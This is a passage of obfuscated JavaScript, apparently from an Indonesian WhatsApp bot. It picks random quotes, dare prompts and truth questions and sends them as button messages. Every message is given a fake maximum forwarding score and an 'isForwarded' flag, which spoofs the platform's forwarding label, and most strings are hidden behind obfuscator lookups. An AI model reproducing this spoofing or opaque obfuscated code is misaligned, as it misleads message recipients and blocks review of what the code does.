c1f,0xda1)+'enjadi\x20kap'+_0x406083(0x5f1,0x3fd,0xa36,0x2d6)+_0x406083(0xb7d,0x77c,0x106b,0x1082)+'dupnya.',_0x4aaba1(0x9ba,0xedc,0xbcb,0xdf6)+'ng\x20jujur\x20l'+_0x406083(0x9c6,0x728,0x661,0x912)+_0x4aaba1(0x4f7,0x811,0x3cc,0x37e)+_0x4aaba1(0x866,0x544,0x393,0x56d)+_0x4aaba1(0x931,0xd71,0xe38,0xdec)+_0x406083(0xd46,0xedb,0xb56,0x1098)+_0x406083(0x3bb,0x490,0x317,0x8c7)+_0x406083(0x90d,0x930,0xbd6,0xd43)+'ng.',_0x406083(0x393,0x520,0x19f,0x53)+_0x4aaba1(0xc1f,0xfb8,0x8f8,0xad2)+_0x406083(0x38c,-0x103,0x33,0x357)+_0x406083(0x970,0x7b2,0xc3c,0x922)+_0x406083(0xcab,0xc49,0x1094,0xc1e)+_0x4aaba1(0x7a4,0x6ea,0xbfa,0x76d)+_0x406083(0xcb5,0x1135,0xd1f,0xfee)+'us.',_0x406083(0x89b,0x891,0x97c,0xac3)+_0x406083(0x8c6,0xae2,0xcb4,0x3dd)+_0x406083(0x438,0xf2,0x3fb,0x948)+_0x406083(0x905,0x839,0xb38,0x8e9)+'eri\x20kita\x20j'+_0x4aaba1(0xabb,0x781,0x96a,0x7e3)+'\x20berusaha.'+_0x406083(0x6b0,0x9d5,0x1f5,0x986)+_0x406083(0x3d9,0x633,0x561,0x487)+_0x406083(0xb34,0x739,0x655,0xffc)+_0x4aaba1(0x927,0x802,0xd47,0xb21)+_0x4aaba1(0x6fd,0xbfa,0xac8,0x98e),'Penundaan\x20'+_0x4aaba1(0x8e8,0xcf3,0xa7b,0x53d)+_0x4aaba1(0xb5e,0xb3e,0xbb6,0xdb4)+_0x406083(0x4e9,0x1de,0xa5,0x20d)+_0x406083(0xaa5,0x609,0x66f,0xc78)+'.',_0x4aaba1(0x8fa,0x796,0xbf8,0xe1a)+_0x406083(0x7c8,0x960,0x509,0x7da)+'enatap\x20mat'+'a,\x20namun\x20m'+_0x4aaba1(0xa3d,0xc1c,0xc70,0x5f7)+_0x406083(0x804,0x573,0xa7e,0x3d6)+_0x4aaba1(0xd2d,0xc90,0x1091,0x83d)+_0x406083(0x59d,0x250,0x700,0x133),'Kita\x20adala'+_0x4aaba1(0xb17,0xd7c,0xb4f,0xbc8)+_0x406083(0xac7,0x652,0xe85,0x9e6)+_0x4aaba1(0xc91,0xbed,0xe5a,0xf03)+_0x4aaba1(0x580,0x455,0x148,0x764)+_0x4aaba1(0x418,0x8d5,0x3a4,-0xa5)+_0x406083(0x3ec,0x49c,0x618,0x71c)+_0x4aaba1(0x3b3,0x7ba,0x2f6,0x1d5)+_0x406083(0xa9c,0xfa3,0x85c,0x7fe)+'dakan,\x20tet'+_0x4aaba1(0xd74,0xaf9,0x95a,0xf79)+'aan.',_0x4aaba1(0x749,0x58b,0x688,0x365)+_0x406083(0xd3b,0x10d6,0x1219,0xe34)+'a\x20menjadik'+_0x406083(0x71a,0x48d,0x2fc,0x773)+_0x4aaba1(0x703,0x5ae,0x713,0x3c7)+_0x4aaba1(0x81c,0x370,0x636,0x4f3)+'di\x20seperti'+_0x4aaba1(0x6dc,0x35c,0x867,0x763)+_0x406083(0xb06,0x813,0x844,0xb4e)+_0x4aaba1(0x524,0x5b4,0x566,0x275)+'atu\x20saja.','Jika\x20Anda\x20'+_0x406083(0x83a,0xa68,0x4d6,0xb5b)+_0x406083(0xa46,0xc04,0x842,0x78d)+_0x4aaba1(0x5c5,0x588,0xacf,0x80c)+_0x4aaba1(0xa72,0xa43,0xbc0,0xacf)+'da\x20akan\x20me'+'ndapatkan\x20'+'semua\x20cint'+_0x4aaba1(0xb09,0x8fd,0xd56,0xc9e)+_0x406083(0x960,0x527,0x988,0x844)+'.','Masalah\x20ak'+_0x406083(0xb40,0xdf1,0xb44,0xe43)+_0x406083(0x3d8,0x6a0,0x107,0x88d)+_0x4aaba1(0x4c3,0x45c,0xc5,0x26b)+_0x4aaba1(0xa76,0x70d,0xc30,0xcae)+_0x4aaba1(0x432,0x7db,0x458,0x788)+_0x4aaba1(0x536,0x38,0x25a,0xf0)+_0x406083(0x719,0xa80,0x282,0x2d6)+'\x20mungkin.\x20'+_0x4aaba1(0x6ad,0x298,0xa17,0x894)+_0x4aaba1(0xd54,0x11a3,0x910,0x869)+_0x4aaba1(0x7b9,0x868,0x9fb,0x8da)+_0x406083(0x441,0x542,0x56,0x39b)+'epat\x20ia\x20pe'+_0x4aaba1(0xb02,0xe64,0x6b4,0x64d),_0x406083(0xd11,0x11b7,0xba2,0xc44)+_0x406083(0x689,0x59d,0x876,0x40f)+_0x4aaba1(0xb9e,0xe4f,0xadc,0xf40)+_0x406083(0xa28,0xcf9,0xb5b,0xcaa)+_0x4aaba1(0x396,0x565,-0xc9,0x769)+_0x4aaba1(0x874,0xbce,0x416,0x829)+_0x4aaba1(0x5b4,0x7a3,0x4b3,0x75b)+_0x406083(0xbfc,0x704,0xa8f,0xc63)+'akukan\x20bis'+'a\x20mengubah'+_0x406083(0x7d1,0x614,0xbba,0x423)+'n.',_0x406083(0xa30,0x7c8,0x771,0xa27)+_0x4aaba1(0x7b7,0xb1d,0x5ce,0x81c)+_0x406083(0x3a3,0x706,-0xc0,0x687)+_0x406083(0xd97,0xc0f,0xee6,0xf74)+'n.',_0x4aaba1(0x651,0x830,0x467,0x726)+'g\x20kreatif\x20'+_0x406083(0x818,0x756,0xaa3,0x376)+_0x406083(0x9fb,0x65f,0x617,0x988)+_0x4aaba1(0x58b,0x2d2,0xa98,0xb8)+_0x4aaba1(0x759,0x515,0x2db,0xc33)+'ukan\x20oleh\x20'+_0x406083(0xcd6,0x1056,0x11d6,0xc0a)+'untuk\x20meng'+_0x4aaba1(0x59c,0x72c,0x14a,0x86f)+_0x406083(0xd53,0xdb7,0x1037,0x1229),'Dimanapun\x20'+_0x406083(0x7db,0x492,0xadd,0x52b)+_0x4aaba1(0xd34,0x11c7,0xcb3,0x10e3)+_0x406083(0x811,0x9d3,0xcb3,0x37d)+_0x406083(0xae5,0xed0,0x8e0,0x88b)+_0x4aaba1(0x52e,0x909,0x79a,0x9e8)+_0x4aaba1(0xd7e,0xf68,0x9e7,0x1093)+_0x406083(0xcc6,0x10c7,0x824,0x934)+'dari\x20yang\x20'+_0x406083(0xb68,0xbe6,0x106f,0xfc5)+_0x4aaba1(0x56c,0x8fb,0x6c8,0x1c0),'Kebencian\x20'+_0x4aaba1(0x6d1,0x460,0xaf5,0x85d)+_0x406083(0x4cb,0x748,0x97c,0x17c)+_0x406083(0xc43,0x9ee,0xce6,0x950)+_0x4aaba1(0x423,0x44f,0x298,0x37e)+_0x406083(0xc4b,0xd0c,0xc92,0xd3e)+'l.','Anda\x20tidak'+_0x406083(0x738,0xc43,0x269,0x921)+_0x406083(0x5cb,0x782,0xa8b,0xb2)+'l\x20pada\x20kal'+_0x4aaba1(0x843,0x9b9,0x588,0xb22),'Satu\x20jam\x20y'+_0x406083(0x5de,0x221,0x843,0x2cd)+_0x4aaba1(0x46f,0x3cd,-0x9b,0x4a0)+_0x406083(0xae6,0xc90,0xa71,0xcee)+'dan\x20mengun'+_0x406083(0x901,0x8ba,0xad5,0x7ac)+_0x406083(0x885,0x71c,0xb42,0x4d1)+'tahun-tahu'+'n\x20bermimpi'+_0x4aaba1(0x554,0x815,0xf7,0xa0d)+_0x4aaba1(0x972,0xe32,0x722,0x58c)+'.',_0x4aaba1(0xc56,0x9b8,0x8e1,0x805)+'k\x20yang\x20bis'+_0x4aaba1(0x7ec,0x3b0,0xbde,0x518)+_0x406083(0x8aa,0x40e,0xc77,0xb01)+_0x4aaba1(0x8c1,0x75c,0xa8d,0x4d9)+'n\x20bukanlah'+_0x406083(0x787,0x478,0x3b0,0x90e)+'n\x20kekayaan'+_0x4aaba1(0x98c,0x927,0xa19,0x72a)+_0x406083(0xb7e,0xdaa,0xfcb,0xd2a)+_0x4aaba1(0xc58,0x1120,0xeac,0x947)+_0x406083(0xaa3,0x692,0xd94,0xec4)+_0x406083(0xd07,0xaa3,0xca3,0xb3e)+_0x406083(0x650,0xb6d,0x6d3,0x3c1)+'i.',_0x4aaba1(0x74b,0x4cc,0x625,0x826)+_0x4aaba1(0xc8a,0xb8c,0x7ff,0xa3a)+_0x406083(0xcc8,0x848,0xd18,0xaa0)+_0x406083(0xa1a,0x6f0,0x8e8,0xd56)+_0x4aaba1(0x767,0x29e,0xbc0,0x5c7)+_0x406083(0x9ea,0xbbb,0xd83,0xc06)+'\x20jaminan\x20k'+'egagalan.','Aku\x20tidak\x20'+'tahu\x20kunci'+_0x4aaba1(0xae1,0x632,0x76c,0xb42)+_0x406083(0xd45,0xe78,0xd81,0x8d7)+_0x406083(0x584,0x8d3,0x32d,0x705)+'nuju\x20kegag'+_0x406083(0x88e,0x85e,0x69b,0xc0a)+_0x4aaba1(0xd91,0xc9b,0xd1e,0xc9b)+_0x4aaba1(0x99b,0xc9b,0xb9f,0xde8)+'mua\x20orang\x20'+'senang.'],su=kta[Math[_0x406083(0x48f,0x353,0x762,0x1af)](Math[_0x406083(0xaaa,0x837,0xe00,0x73c)]()*kta['length'])],_0x5eb4c4={};_0x5eb4c4[_0x406083(0x50e,0xa18,0x614,0x8ce)+'t']=_0x406083(0x7d0,0x6e3,0x9bc,0x2dd);const _0x330c3b={};_0x330c3b[_0x4aaba1(0x78d,0xba1,0xc29,0x57e)]='owner',_0x330c3b[_0x4aaba1(0x6e9,0x28b,0x24a,0x28d)]=_0x5eb4c4,_0x330c3b['type']=0x1;const _0x3c28aa={};_0x3c28aa[_0x406083(0x50e,0x5e5,0x856,0x8b9)+'t']='Next\x20➡️';const _0x1a74d7={};_0x1a74d7[_0x406083(0x758,0x76b,0x791,0xb15)]=''+command,_0x1a74d7[_0x4aaba1(0x6e9,0x2a4,0x73b,0x336)]=_0x3c28aa,_0x1a74d7[_0x4aaba1(0x816,0x932,0x894,0x93a)]=0x1;var buttonns=[_0x330c3b,_0x1a74d7];buttonMessage={'contentText':su,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+'more\x20quote'+_0x406083(0x9cf,0xeb8,0xc84,0x4d9))+enter+_0x406083(0x9a1,0xd0f,0x7f0,0x55c)+sender[_0x406083(0x676,0x6f3,0xae3,0x150)]('@')[0x1*0x10ad+-0x11b*0x12+0x37*0xf],'buttons':buttonns,'headerType':0x1};const _0x598fe9={};_0x598fe9['text']='hi',_0x598fe9[_0x406083(0x8cf,0x8c2,0x68e,0xaf5)+'Score']=0x3b9aca00,_0x598fe9[_0x4aaba1(0x858,0x5ef,0xcf5,0x510)+'d']=!![],_0x598fe9[_0x4aaba1(0x471,-0xab,0x8cc,0x19f)+_0x4aaba1(0x441,0x527,0x6ef,0x5b8)]=!![],_0x598fe9[_0x406083(0x858,0xcef,0xd4d,0x5f2)+'id']=[sender];const _0x4e66e4={};_0x4e66e4[_0x406083(0x478,0x5d5,0x82d,0x54)]=_0x406083(0xbd0,0x9ae,0xa65,0x758)+'21',_0x4e66e4[_0x406083(0x852,0x8c5,0x9d0,0x61b)+'o']=_0x598fe9,_0x4e66e4[_0x4aaba1(0xce3,0xb5d,0xe73,0xf0e)]=ftoko,_0x4e66e4[_0x406083(0x43c,0x67c,0x20,0x4ba)+_0x406083(0x40c,0x761,-0xe6,0x459)]=!![],alpha[_0x406083(0x87f,0x7c1,0x7d0,0x73c)+'e'](from,buttonMessage,MessageType[_0x4aaba1(0xa29,0xea6,0xbb7,0x5f8)+_0x406083(0x4ca,0x11b,0x369,0x42)],_0x4e66e4);break;case _0x4aaba1(0x983,0x7d1,0xa0b,0x4af):const dare=[_0x4aaba1(0x9e6,0xdd8,0x9fc,0x72f)+_0x4aaba1(0x579,0x502,0x2a5,0x27d)+_0x406083(0xd5a,0x92f,0xafd,0xd0e)+_0x4aaba1(0x68f,0x1fb,0xb65,0x342)+_0x4aaba1(0x853,0x41c,0x88a,0x8db)+_0x406083(0xaaf,0x9b2,0xb61,0xd87)+_0x406083(0x9c5,0xc33,0xc38,0xe45),'telfon\x20cru'+_0x406083(0xcc3,0xebe,0x8d5,0xbc5)+_0x4aaba1(0xddc,0x1001,0x1241,0xefc)+_0x4aaba1(0xaa6,0xbd6,0xa90,0xc60)+_0x4aaba1(0x616,0x137,0x7ed,0x2fc),_0x406083(0x3f8,0x1c4,0x6bc,0x146)+_0x4aaba1(0x955,0xcad,0x5e0,0xc2e)+_0x406083(0x97e,0xb28,0x9c9,0x5e4),_0x4aaba1(0xa37,0xbd0,0x744,0x8db)+'MU\x20CANTIK\x20'+'BANGET\x20NGG'+'AK\x20BOHONG\x22'+_0x4aaba1(0x4ec,-0x1f,0x4cf,0x61a),'ss\x20recent\x20'+_0x4aaba1(0x84c,0xac2,0x39a,0x65c)+_0x406083(0x633,0x604,0xb01,0x2b8),_0x406083(0xd93,0x9e3,0x949,0x122a)+'🤥\x20setiap\x20n'+_0x4aaba1(0xa03,0xe14,0xec7,0xe2a)+'c/pc\x20selam'+_0x4aaba1(0xa82,0x5b8,0xa51,0xd9e),'kirim\x20voic'+_0x4aaba1(0xd80,0xbf5,0x1087,0xca8)+_0x4aaba1(0x79e,0xa50,0x3f0,0x4ca)+'call\x20u\x20bab'+'y?','drop\x20kutip'+_0x406083(0xca9,0xa82,0xc90,0xe59)+_0x4aaba1(0x7d2,0x6f7,0x9b9,0x394)+_0x4aaba1(0xc88,0xa67,0xfe8,0x113a)+_0x406083(0xd9e,0xefe,0xe0a,0xc02)+_0x406083(0xbb1,0x9dc,0xf77,0xc15)+_0x4aaba1(0xb25,0xe3e,0x816,0x8d5),'pake\x20foto\x20'+_0x406083(0xd83,0xa62,0xea1,0xf27)+_0x406083(0xb76,0x104b,0xaab,0xae9),_0x4aaba1(0x9f9,0xd7b,0x765,0x5ce)+_0x406083(0x5e7,0x9ee,0x319,0x31b)+_0x406083(0xb12,0xc16,0xd7c,0xaa8)+'m',_0x4aaba1(0xc35,0xe5a,0x7f1,0x9cb)+'\x20menjadi\x20\x22'+_0x4aaba1(0x8cf,0xc67,0x5b6,0x6c9)+'ucinta\x20lun'+_0x406083(0x845,0x587,0x87a,0x6cc)+_0x406083(0x748,0x444,0x351,0x80c),_0x4aaba1(0xb88,0x863,0xf3b,0xfbb)+_0x4aaba1(0x640,0x2ad,0x727,0x7db)+_0x4aaba1(0xd3b,0x982,0x90a,0xda3)+'i\x20%batre\x20k'+_0x406083(0xb42,0xcbd,0xecc,0x98d)+_0x406083(0x527,0x1c0,0x151,0x3a3)+_0x4aaba1(0x9af,0x580,0x9e5,0x85a)+_0x4aaba1(0xc27,0xc83,0xa6e,0xed3)+_0x406083(0xd2a,0xcd1,0xd55,0xb1f),_0x4aaba1(0x73b,0x36e,0x64a,0x8f8)+_0x406083(0xb11,0x78f,0xc9c,0x9ed)+_0x4aaba1(0x8ed,0x44d,0x623,0xa9b)+_0x406083(0x74e,0xa3b,0xb6f,0x2d7)+_0x4aaba1(0x8e5,0xa8b,0x6b8,0x90c)+'an',_0x4aaba1(0xb3d,0xf4e,0x7ac,0x66a)+_0x4aaba1(0x3f7,0x6cb,0x794,0x902)+_0x406083(0x35e,-0xca,0xb3,0x78c)+_0x406083(0x838,0x56c,0xbd1,0xd2c),'bilang\x20\x22i\x20'+_0x4aaba1(0x59a,0x57f,0x3a6,0xc6)+'n\x20you,\x20mau'+'\x20jadi\x20paca'+_0x406083(0xc82,0xb79,0x76a,0x106c)+_0x4aaba1(0x5b8,0x469,0x58f,0x7e0)+_0x4aaba1(0xb22,0x69b,0x949,0xc0b)+_0x4aaba1(0xb03,0xa66,0x8d3,0xf6c)+'gt\x20kamu\x20ch'+_0x4aaba1(0xd35,0x8db,0x849,0x817)+_0x406083(0x8ea,0x9a7,0x63c,0x3d6)+_0x4aaba1(0x5a7,0x19f,0x2bc,0x267)+'dia\x20bales,'+_0x406083(0x942,0x469,0xcb5,0x60e)+_0x4aaba1(0x704,0x840,0x700,0xa49)+_0x406083(0xcef,0xbc6,0xb96,0x1150),_0x4aaba1(0xca1,0xd13,0xae2,0xa9b)+_0x4aaba1(0xb71,0xe9a,0xc9f,0xf29)+'mu!',_0x4aaba1(0x9bb,0x903,0x493,0xd0a)+_0x4aaba1(0xbc1,0xc82,0x9ee,0xb4f)+_0x4aaba1(0x5bf,0xa2f,0x828,0x43b),_0x406083(0x582,0xa86,0x964,0xa89)+_0x406083(0x77c,0xbe8,0x8e1,0xa33)+_0x406083(0x58d,0x6c1,0x951,0x5ac)+_0x4aaba1(0x654,0x949,0x7fc,0x81f),_0x4aaba1(0x796,0x434,0x300,0xa0d)+_0x4aaba1(0x69f,0x48f,0x26d,0x720)+_0x406083(0xaeb,0x662,0xd5b,0x674)+'\x20satu\x20tema'+_0x4aaba1(0xb21,0xd8c,0x1031,0xdfa),_0x406083(0x9ed,0xe08,0xd70,0xd8f)+_0x406083(0xd29,0x11bd,0x11c4,0x1014)+_0x406083(0x907,0x717,0x5ce,0x561)+'ku\x20anak\x20pu'+_0x406083(0x376,-0x8a,0x752,0x5bb),'teriak\x20pak'+_0x406083(0xa0a,0xa72,0xaf0,0x5cf)+_0x406083(0x7bb,0x774,0xa6c,0x2c0)+'vn\x20trus\x20ki'+'rim\x20kesini',_0x406083(0x703,0x297,0xa26,0x660)+_0x4aaba1(0xc33,0xac1,0x9a8,0xe0c)+_0x4aaba1(0x976,0xe14,0xa87,0xba9)+_0x4aaba1(0xa10,0xc55,0x720,0x69c)+'n\x20rumah\x20mu',_0x4aaba1(0xc35,0x1002,0xf8c,0xf8e)+'\x20jadi\x20\x22\x20BO'+_0x4aaba1(0xbb8,0x9e6,0xdf9,0x6e0)+_0x4aaba1(0xb98,0xf24,0xb07,0xb31),_0x4aaba1(0x670,0xb6c,0x83f,0x177)+'kerasukan,'+_0x406083(0x5c1,0x390,0x224,0xa24)+_0x4aaba1(0x565,0x909,0x91f,0x84d)+_0x4aaba1(0x5f9,0x229,0xac2,0x5b2)+'asukan\x20bel'+'alang,\x20ker'+_0x406083(0x864,0x426,0x8fc,0x448)+_0x406083(0x602,0x6d1,0x52a,0x25b)],der=dare[Math[_0x406083(0x48f,0x3f6,0x7af,0x4a9)](Math['random']()*dare['length'])],_0x455a54={};_0x455a54[_0x406083(0x50e,0x43f,0x912,0x415)+'t']=_0x4aaba1(0x805,0xb15,0x4f8,0xc1a);const _0x383589={};_0x383589['buttonId']=_0x406083(0xd1d,0xdfb,0xaad,0xfbb),_0x383589[_0x4aaba1(0x6e9,0x4ed,0x323,0x411)]=_0x455a54,_0x383589[_0x4aaba1(0x816,0x91e,0x8b4,0x59b)]=0x1;const _0x3da6ad={};_0x3da6ad[_0x4aaba1(0x543,0x66,0x1c5,0x3c7)+'t']=_0x406083(0x4df,0x6ce,0xda,0x284);const _0x457159={};_0x457159['buttonId']=''+command,_0x457159[_0x406083(0x6b4,0x3c0,0x25b,0xa15)]=_0x3da6ad,_0x457159[_0x406083(0x7e1,0xaa0,0x94e,0xb39)]=0x1;var buttonns=[_0x383589,_0x457159];buttonMessage={'contentText':der,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+_0x4aaba1(0x892,0xbc6,0x657,0xd6c)+_0x4aaba1(0xa04,0xf08,0x970,0x5f0))+enter+_0x406083(0x9a1,0xe7a,0xd49,0xab5)+sender[_0x406083(0x676,0x35b,0x328,0x58b)]('@')[0x4*-0x5e9+-0xc76*-0x2+-0x148],'buttons':buttonns,'headerType':0x1};const _0x1e77b6={};_0x1e77b6[_0x4aaba1(0x533,0x80a,0x3f9,0x1ee)]='hi',_0x1e77b6[_0x406083(0x8cf,0xc67,0x57a,0xbc3)+_0x406083(0x973,0x9e5,0xd24,0x94c)]=0x3b9aca00,_0x1e77b6[_0x4aaba1(0x858,0x807,0x9e3,0x5d4)+'d']=!![],_0x1e77b6[_0x406083(0x43c,0x591,0x3c9,0x71d)+'ral']=!![],_0x1e77b6[_0x4aaba1(0x88d,0xcc5,0xd98,0x76d)+'id']=[sender];const _0x420970={};_0x420970[_0x4aaba1(0x4ad,0x197,0x3db,0x1ef)]='Botwea\x20©2k'+'21',_0x420970['contextInf'+'o']=_0x1e77b6,_0x420970['quoted']=ftoko,_0x420970[_0x4aaba1(0x471,0x496,0x25,0x159)+_0x4aaba1(0x441,0x376,0x27,0x6a5)]=!![],alpha[_0x4aaba1(0x8b4,0x709,0xcc2,0x944)+'e'](from,buttonMessage,MessageType[_0x406083(0x9f4,0xa52,0x68b,0x6ea)+'sage'],_0x420970);break;case'truth':const trut=[_0x406083(0xc35,0xabb,0x8b0,0x73d)+_0x4aaba1(0x961,0xd66,0xa39,0x97b)+_0x4aaba1(0xab9,0x8a4,0xaa9,0x596)+'rapa\x20lama?','Kalau\x20bole'+_0x406083(0x9e9,0x637,0x9d2,0x561)+_0x4aaba1(0x83d,0x4c2,0x6e6,0xc43)+'\x20gc/luar\x20g'+_0x4aaba1(0x5b3,0x298,0x932,0x16e)+'ng\x20akan\x20ka'+_0x4aaba1(0xc26,0x101f,0xfc2,0x7c0)+_0x406083(0x550,0x6c4,0x35f,0x915)+'boleh\x20beda'+'/sma\x20jenis'+')','apa\x20ketaku'+_0x406083(0xbd1,0x72b,0xc4f,0xb65)+'ar\x20kamu?','pernah\x20suk'+_0x406083(0xbc3,0xd58,0x7b4,0x812)+_0x4aaba1(0x8d1,0xd7b,0x864,0x880)+'asa\x20orang\x20'+'itu\x20suka\x20s'+_0x406083(0x8f7,0x723,0x76d,0x9a6)+_0x4aaba1(0x618,0x683,0x3cf,0x861),_0x406083(0x44e,0x3,0xc,0x7a5)+_0x406083(0xbdb,0xbdc,0x85f,0xf5d)+'car\x20teman\x20'+'mu\x20yang\x20pe'+_0x406083(0xc89,0xbfd,0xdde,0xae3)+_0x4aaba1(0x4cd,0x887,0x92d,0x802)+_0x4aaba1(0xa5a,0xb97,0x59a,0xc2c),_0x406083(0x64c,0xa60,0x54c,0x4b6)+_0x4aaba1(0x5fc,0x5a5,0x251,0x236)+_0x4aaba1(0xb2d,0xf46,0xf02,0xaef)+_0x4aaba1(0xaab,0x608,0x987,0x9bd)+_0x406083(0x9be,0xc51,0x5c6,0x88b),_0x406083(0x7d8,0x7a5,0x989,0xacc)+_0x4aaba1(0x571,0x7d0,0x235,0x22d)+_0x406083(0x508,0x292,0x22b,0x2eb)+_0x406083(0x6f2,0xa39,0x6aa,0x393)+_0x406083(0x4a8,0x3d1,0x2cb,0x6ad),_0x4aaba1(0x4f1,0x120,0x250,0x268)+_0x4aaba1(0x398,0x339,0x4ee,0x6db)+_0x406083(0x679,0x63a,0x91e,0x3e2)+_0x406083(0xd09,0x959,0xf67,0xb5e)+_0x4aaba1(0x4fb,0xd4,0x7e,0xb1)+'sama\x20siapa'+_0x4aaba1(0xb5b,0xbbc,0xcc7,0xd54)+'gimana\x20bro'+'u?',_0x406083(0x715,0x247,0x862,0x591)+'i\x20selingku'+_0x4aaba1(0x687,0x873,0x5f0,0x7d2),_0x406083(0x61e,0x411,0x672,0x2cc)+_0x4aaba1(0x563,0x349,0x2ba,0x6b3)+_0x4aaba1(0x429,-0x4e,0x17e,0x90d),_0x4aaba1(0xa27,0xbb3,0x7b3,0xb1e)+'g\x20yang\x20pal'+'ing\x20berpen'+'garuh\x20kepa'+_0x4aaba1(0x444,0x950,0x464,0x599)+_0x406083(0x7c2,0x57a,0x5e4,0xb1f),'hal\x20memban'+'ggakan\x20apa'+'\x20yang\x20kamu'+_0x4aaba1(0x8b7,0x446,0x969,0xbf3)+'di\x20tahun\x20i'+'ni',_0x4aaba1(0xa27,0xe61,0x729,0x7a4)+_0x4aaba1(0xbce,0x6b7,0xe8f,0x1068)+_0x4aaba1(0xb6c,0xa61,0xca4,0xac8)+'u\x20sange','siapa\x20oran'+_0x4aaba1(0x985,0x8f7,0xbd4,0x991)+'nah\x20buatmu'+_0x4aaba1(0x8f1,0xc3a,0xd3f,0x98a),_0x4aaba1(0x4fd,0x724,0x2bb,0x701)+'slim)\x20pern'+'ah\x20ga\x20sola'+_0x406083(0x7cc,0xce1,0xb73,0x464)+'?',_0x4aaba1(0x504,0x434,0x4b7,0x2e9)+'\x20paling\x20me'+_0x4aaba1(0xcb4,0x88f,0xa54,0x85d)+_0x406083(0xbb6,0xa7e,0x6bc,0x1046)+_0x406083(0x4a9,0x476,0x587,0x449)+_0x406083(0x3b2,0x3c2,-0xab,-0x1a),_0x406083(0xa9d,0xf76,0x837,0xc6b)+_0x4aaba1(0x3fa,0x62d,0x3ae,0x384)+_0x4aaba1(0x7c5,0xb8d,0x39f,0x9d4)+_0x406083(0x492,0x95e,0x494,0x7c5),'pernah\x20nol'+_0x406083(0xcb1,0x7e8,0xf19,0xa3a)+_0x406083(0xc96,0x9e4,0x779,0x107c)+_0x4aaba1(0x5d4,0x1eb,0x3b0,0x8c1),_0x406083(0x6b8,0xa29,0x6b0,0x748)+_0x406083(0x820,0x463,0x8fc,0x5e3)+_0x406083(0xa77,0x5d3,0x85b,0xd82)+_0x4aaba1(0xba1,0xc4f,0x8a4,0xff2)+'hati\x20yang\x20'+_0x406083(0xcf0,0xf4e,0xd98,0x119c)+_0x406083(0xc87,0x10d2,0xdcf,0xcb2),_0x406083(0x4aa,0x98d,0x39b,0x8a3)+_0x4aaba1(0xcda,0xaf0,0xdfc,0x9c8)+_0x4aaba1(0x466,0x5b4,0x871,0x139)+_0x4aaba1(0x5d0,0x5e4,0x997,0x8ff)+_0x406083(0x84b,0x3b1,0x933,0xcff),'kebiasaan\x20'+_0x406083(0xbd8,0x10d8,0xeab,0x7b0)+'o\x20pas\x20di\x20s'+_0x406083(0x409,0x560,0x307,0x171)+'?'],ttrth=trut[Math['floor'](Math['random']()*trut[_0x406083(0x797,0x7bd,0x98d,0x533)])],_0x2e61e4={};_0x2e61e4[_0x4aaba1(0x543,0x229,0x8b,0x625)+'t']=_0x4aaba1(0x805,0xbae,0x5e5,0x3fb);const _0x14a845={};_0x14a845[_0x4aaba1(0x78d,0x429,0x916,0x902)]=_0x406083(0xd1d,0xe36,0xce3,0x8e4),_0x14a845[_0x406083(0x6b4,0x637,0x1f4,0x263)]=_0x2e61e4,_0x14a845[_0x4aaba1(0x816,0xbf2,0x5cb,0x85a)]=0x1;const _0x4530da={};_0x4530da[_0x4aaba1(0x543,0x6a0,0x906,0x544)+'t']=_0x4aaba1(0x514,0x8ef,0x62b,0x357);const _0x5701a2={};_0x5701a2['buttonId']=''+command,_0x5701a2[_0x4aaba1(0x6e9,0xa1d,0x591,0x3e0)]=_0x4530da,_0x5701a2[_0x406083(0x7e1,0x791,0x5a3,0x40e)]=0x1;var buttonns=[_0x14a845,_0x5701a2];buttonMessage={'contentText':ttrth,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x4aaba1(0x9f7,0x608,0xbd8,0xa25)+_0x4aaba1(0x892,0xb2b,0xd97,0x7eb)+_0x4aaba1(0xa04,0xa18,0xce2,0x597))+enter+_0x4aaba1(0x9d6,0xcff,0x9a2,0xed1)+sender[_0x4aaba1(0x6ab,0xa9d,0x515,0x300)]('@')[-0x2*-0xcfb+-0x51b+-0x13*0x119],'buttons':buttonns,'headerType':0x1};const _0xee8996={};_0xee8996[_0x406083(0x4fe,0x7dd,0x662,0x873)]='hi',_0xee8996['forwarding'+_0x4aaba1(0x9a8,0xa8d,0xcbd,0x5bb)]=0x3b9aca00,_0xee8996['isForwarde'+'d']=!![],_0xee8996[_0x406083(0x43c,0xdf,0x151,0x4af)+'ral']=!![],_0xee8996[_0x4aaba1(0x88d,0xb41,0xaf5,0x85b)+'id']=[sender];const _0x3f53e7={};_0x3f53e7[_0x4aaba1(0x4ad,0xdb,0x75d,0x1ab)]=_0x406083(0xbd0,0x758,0x837,0xba0)+'21',_0x3f53e7[_0x406083(0x852,0x52d,0xa1e,0x3e9)+'o']=_0xee8996,_0x3f53e7['quoted']=ftoko,_0x3f53e7['sendEpheme'+_0x406083(0x40c,0x15c,0x10e,0x377)]=!![],alpha[_0x4aaba1(0x8b4,0x3e5,0x3cb,0xa0a)+'e'](from,buttonMessage,MessageType[_0x406083(0x9f4,0xd3e,0xe74,0x851)+_0x406083(0x4ca,0x37e,0x6ca,0x441)],_0x3f53e7);break;case'katadilan':const cc=[_0x406083(0x3ff,0x54d,0xf3,0x3e7)+_0x406083(0x594,0x521,0xaa8,0x549)+_0x4aaba1(0xbb4,0xec1,0xd86,0xea9)+_0x4aaba1(0x7a4,0xbdf,0xc85,0x498)+_0x406083(0x9aa,0xd21,0x994,0x734)+_0x4aaba1(0xb18,0xd40,0x8c0,0x7c2)+_0x406083(0x773,0xadc,0x736,0x6fd)+_0x4aaba1(0x59f,0x9d1,0x709,0x6b9)+_0x4aaba1(0x5f1,0x467,0x59e,0x47c)+'\x20percaya\x20d'+_0x406083(0x38b,0x670,0x415,0x30c),_0x4aaba1(0x751,0x552,0x67f,0x4ac)+'ndai\x20cembu'+'ru.\x20Malaha'+_0x406083(0x9cd,0x957,0xeb3,0xdef)+_0x406083(0x570,0xa82,0xa0d,0x15e)+_0x4aaba1(0xac8,0xcc9,0x6d7,0x9ce)+_0x406083(0xca1,0xd43,0x79f,0xc51)+_0x406083(0xa24,0xebd,0x92c,0xa4b)+_0x4aaba1(0x4e8,0x842,0x47c,0x512)+_0x4aaba1(0xdab,0xf29,0xf5c,0xe6f)+_0x406083(0x3e9,0x849,0x408,0x527),'Aku\x20enggak'+'\x20pernah\x20ce'+_0x4aaba1(0x953,0xc86,0x88a,0x452)+'a.\x20Bisaku\x20'+_0x4aab